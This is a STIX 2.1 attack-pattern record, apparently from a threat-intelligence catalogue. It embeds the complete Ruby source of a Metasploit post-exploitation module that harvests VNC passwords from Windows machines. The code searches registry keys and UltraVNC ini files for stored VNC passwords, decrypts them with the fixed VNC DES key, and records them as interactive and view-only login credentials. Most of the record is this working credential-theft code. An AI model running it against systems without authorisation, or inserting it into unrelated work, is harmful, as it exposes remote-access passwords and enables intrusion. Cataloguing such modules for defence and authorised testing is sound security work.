{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--30235e5e-3620-48ab-956c-c8c155176d65",
    "created": "2024-08-14T16:33:11.442843Z",
    "modified": "2024-08-14T16:33:11.442847Z",
    "name": "Windows Gather VNC Password Extraction",
    "description": " This module extract DES encrypted passwords in known VNC locations  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/vnc.rb",
            "external_id": "vnc.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather VNC Password Extraction',\n        'Description' => %q{\n          This module extract DES encrypted passwords in known VNC locations\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Kurt Grutzmacher <grutz[at]jingojango.net>',\n          'mubix'\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_fs_stat\n              stdapi_registry_open_key\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def decrypt_hash(hash)\n    if hash.nil?\n      return nil\n    end\n\n    # fixed des key\n    # 5A B2 CD C0 BA DC AF 13\n    fixedkey = \"\\x17\\x52\\x6b\\x06\\x23\\x4e\\x58\\x07\"\n    pass = Rex::Proto::RFB::Cipher.decrypt [hash.to_s].pack('H*'), fixedkey\n    pass.gsub(/\\0/, '')\n  end\n\n  # Pull encrypted passwords from file based storage\n  def file_get(filename, splitvar)\n    client.fs.file.stat(filename)\n    config = client.fs.file.new(filename, 'r')\n    parse = config.read.split\n    value = parse.at(parse.index { |x| x =~ /#{splitvar}/ }).split(splitvar)[1]\n    return value\n  rescue StandardError\n    return nil\n  end\n\n  # Pull encrypted passwords from registry based storage\n  def reg_get(key, variable)\n    root_key, base_key = session.sys.registry.splitkey(key)\n    open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)\n\n    data = open_key.query_value(variable).data\n    if data.is_a? Integer\n      return data\n    else\n      value = data.unpack('H*')[0].to_s\n      return value\n    end\n  rescue StandardError\n    # Registry value not found\n    return nil\n  end\n\n  def run\n    '\n  Hash format\n    :name,\n    :check_file,\n    :check_reg,\n    :pass_variable,\n    :port_variable,\n    :port,\n    :hash,\n    :pass,\n    :viewonly_variable,\n    :viewonly_hash,\n    :viewonly_pass\n  '\n\n    locations = []\n\n    # Checks\n    progfiles_env = session.sys.config.getenvs('ProgramFiles', 'ProgramFiles(x86)')\n    progfiles_env.each do |_k, v|\n      next if v.blank?\n\n      locations << {\n        name: 'UltraVNC',\n        check_file: \"#{v}\\\\UltraVNC\\\\ultravnc.ini\",\n        pass_variable: 'passwd=',\n        viewonly_variable: 'passwd2=',\n        port_variable: 'PortNumber='\n      }\n    end\n\n    # check uninstall key\n    begin\n      root_key, base_key = session.sys.registry.splitkey('HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\Ultravnc2_is1')\n      open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)\n      vnclocation = open_key.query_value('InstallLocation').data\n      locations << {\n        name: 'UltraVNC',\n        check_file: vnclocation + '\\\\ultravnc.ini',\n        pass_variable: 'passwd=',\n        viewonly_variable: 'passwd2=',\n        port_variable: 'PortNumber='\n      }\n    rescue Rex::Post::Meterpreter::RequestError => e\n      vprint_error(e.message)\n    end\n\n    locations << {\n      name: 'WinVNC3_HKLM',\n      check_reg: 'HKLM\\\\Software\\\\ORL\\\\WinVNC3',\n      pass_variable: 'Password',\n      port_variable: 'PortNumber'\n    }\n\n    locations << {\n      name: 'WinVNC3_HKCU',\n      check_reg: 'HKCU\\\\Software\\\\ORL\\\\WinVNC3',\n      pass_variable: 'Password',\n      port_variable: 'PortNumber'\n    }\n\n    locations << {\n      name: 'WinVNC3_HKLM_Default',\n      check_reg: 'HKLM\\\\Software\\\\ORL\\\\WinVNC3\\\\Default',\n      pass_variable: 'Password',\n      port_variable: 'PortNumber'\n    }\n\n    locations << {\n      name: 'WinVNC3_HKCU_Default',\n      check_reg: 'HKCU\\\\Software\\\\ORL\\\\WinVNC3\\\\Default',\n      pass_variable: 'Password',\n      port_variable: 'PortNumber'\n    }\n\n    locations << {\n      name: 'WinVNC_HKLM_Default',\n      check_reg: 'HKLM\\\\Software\\\\ORL\\\\WinVNC\\\\Default',\n      pass_variable: 'Password',\n      port_variable: 'PortNumber'\n    }\n\n    locations << {\n      name: 'WinVNC_HKCU_Default',\n      check_reg: 'HKCU\\\\Software\\\\ORL\\\\WinVNC\\\\Default',\n      pass_variable: 'Password',\n      port_variable: 'PortNumber'\n    }\n\n    locations << {\n      name: 'WinVNC4_HKLM',\n      check_reg: 'HKLM\\\\Software\\\\RealVNC\\\\WinVNC4',\n      pass_variable: 'Password',\n      port_variable: 'PortNumber'\n    }\n\n    locations << {\n      name: 'WinVNC4_HKCU',\n      check_reg: 'HKCU\\\\Software\\\\RealVNC\\\\WinVNC4',\n      pass_variable: 'Password',\n      port_variable: 'PortNumber'\n    }\n\n    locations << {\n      name: 'RealVNC_HKLM',\n      check_reg: 'HKLM\\\\Software\\\\RealVNC\\\\Default',\n      pass_variable: 'Password',\n      port_variable: 'PortNumber'\n    }\n\n    locations << {\n      name: 'RealVNC_HKCU',\n      check_reg: 'HKCU\\\\Software\\\\RealVNC\\\\Default',\n      pass_variable: 'Password',\n      port_variable: 'PortNumber'\n    }\n\n    locations << {\n      name: 'TightVNC_HKLM',\n      check_reg: 'HKLM\\\\Software\\\\TightVNC\\\\Server',\n      pass_variable: 'Password',\n      port_variable: 'RfbPort'\n    }\n\n    locations << {\n      name: 'TightVNC_HKLM_Control_pass',\n      check_reg: 'HKLM\\\\Software\\\\TightVNC\\\\Server',\n      pass_variable: 'ControlPassword',\n      port_variable: 'RfbPort'\n    }\n\n    userhives = load_missing_hives\n    userhives.each do |hive|\n      next if hive['HKU'].nil?\n\n      locations << {\n        name: \"RealVNC_#{hive['SID']}\",\n        check_reg: \"#{hive['HKU']}\\\\Software\\\\RealVNC\\\\Default\",\n        pass_variable: 'Password',\n        port_variable: 'PortNumber'\n      }\n\n      locations << {\n        name: \"WinVNC4_#{hive['SID']}\",\n        check_reg: \"#{hive['HKU']}\\\\Software\\\\RealVNC\\\\WinVNC4\",\n        pass_variable: 'Password',\n        port_variable: 'PortNumber'\n      }\n\n      locations << {\n        name: \"WinVNC_#{hive['SID']}_Default\",\n        check_reg: \"#{hive['HKU']}\\\\Software\\\\ORL\\\\WinVNC\\\\Default\",\n        pass_variable: 'Password',\n        port_variable: 'PortNumber'\n      }\n\n      locations << {\n        name: \"WinVNC3_#{hive['SID']}_Default\",\n        check_reg: \"#{hive['HKU']}\\\\Software\\\\ORL\\\\WinVNC3\\\\Default\",\n        pass_variable: 'Password',\n        port_variable: 'PortNumber'\n      }\n\n      locations << {\n        name: \"WinVNC3_#{hive['SID']}\",\n        check_reg: \"#{hive['HKU']}\\\\Software\\\\ORL\\\\WinVNC3\",\n        pass_variable: 'Password',\n        port_variable: 'PortNumber'\n      }\n    end\n\n    print_status(\"Enumerating VNC passwords on #{sysinfo['Computer']}\")\n\n    locations.map do |e|\n      vprint_status(\"Checking #{e[:name]}...\")\n      if e.key?(:check_reg)\n        e[:port] = reg_get(e[:check_reg], e[:port_variable])\n        e[:hash] = reg_get(e[:check_reg], e[:pass_variable])\n        e[:pass] = decrypt_hash(e[:hash])\n        if e.key?(:viewonly_variable)\n          e[:viewonly_hash] = reg_get(e[:check_reg], e[:viewonly_variable])\n          e[:viewonly_pass] = decrypt_hash(e[:viewonly_hash])\n        end\n      elsif e.key?(:check_file)\n        e[:port] = file_get(e[:check_file], e[:port_variable])\n        e[:hash] = file_get(e[:check_file], e[:pass_variable])\n        e[:pass] = decrypt_hash(e[:hash])\n        if e.key?(:viewonly_variable)\n          e[:viewonly_hash] = file_get(e[:check_file], e[:viewonly_variable])\n          e[:viewonly_pass] = decrypt_hash(e[:viewonly_hash])\n        end\n      end\n      # reporting\n      if !e[:pass].nil?\n        if e[:port].nil?\n          e[:port] = 5900\n        end\n        print_good(\"Location: #{e[:name]} => Hash: #{e[:hash]} => Password: #{e[:pass]} => Port: #{e[:port]}\")\n\n        service_data = {\n          address: ::Rex::Socket.getaddress(session.sock.peerhost, true),\n          port: e[:port],\n          service_name: 'vnc',\n          protocol: 'tcp',\n          workspace_id: myworkspace_id\n        }\n\n        # Assemble data about the credential objects we will be creating\n        credential_data = {\n          origin_type: :session,\n          session_id: session_db_id,\n          post_reference_name: refname,\n          private_type: :password,\n          private_data: (e[:pass]).to_s\n        }\n\n        # Merge the service data into the credential data\n        credential_data.merge!(service_data)\n\n        # Create the Metasploit::Credential::Core object\n        credential_core = create_credential(credential_data)\n\n        # Assemble the options hash for creating the Metasploit::Credential::Login object\n        login_data = {\n          access_level: 'interactive',\n          core: credential_core,\n          status: Metasploit::Model::Login::Status::UNTRIED\n        }\n\n        # Merge in the service data and create our Login\n        login_data.merge!(service_data)\n        login = create_credential_login(login_data)\n\n      end\n      next if e[:viewonly_pass].nil?\n\n      print_good(\"VIEW ONLY: #{e[:name]} => #{e[:viewonly_hash]} => #{e[:viewonly_pass]} on port: #{e[:port]}\")\n\n      service_data = {\n        address: ::Rex::Socket.getaddress(session.sock.peerhost, true),\n        port: e[:port],\n        service_name: 'vnc',\n        protocol: 'tcp',\n        workspace_id: myworkspace_id\n      }\n\n      # Assemble data about the credential objects we will be creating\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        private_type: :password,\n        private_data: (e[:viewonly_pass]).to_s\n      }\n\n      # Merge the service data into the credential data\n      credential_data.merge!(service_data)\n\n      # Create the Metasploit::Credential::Core object\n      credential_core = create_credential(credential_data)\n\n      # Assemble the options hash for creating the Metasploit::Credential::Login object\n      login_data = {\n        access_level: 'view_only',\n        core: credential_core,\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n\n      # Merge in the service data and create our Login\n      login_data.merge!(service_data)\n      login = create_credential_login(login_data)\n    end\n    unload_our_hives(userhives)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}